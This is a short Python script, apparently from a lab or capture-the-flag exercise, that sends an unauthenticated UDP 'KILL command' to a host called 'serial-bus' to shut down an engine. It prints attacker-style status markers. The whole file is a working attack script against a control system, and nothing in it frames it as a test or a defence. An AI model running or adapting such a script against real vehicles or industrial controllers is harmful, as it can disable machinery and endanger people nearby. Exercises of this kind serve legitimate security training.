import socket
import sys

TARGET_IP = "serial-bus"
PORT = 5001

def kill_engine():
    print(f"[*] Sending KILL command (0x00) to {TARGET_IP}:{PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(b"0x00", (TARGET_IP, PORT))
        print("[+] Command sent.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    kill_engine()
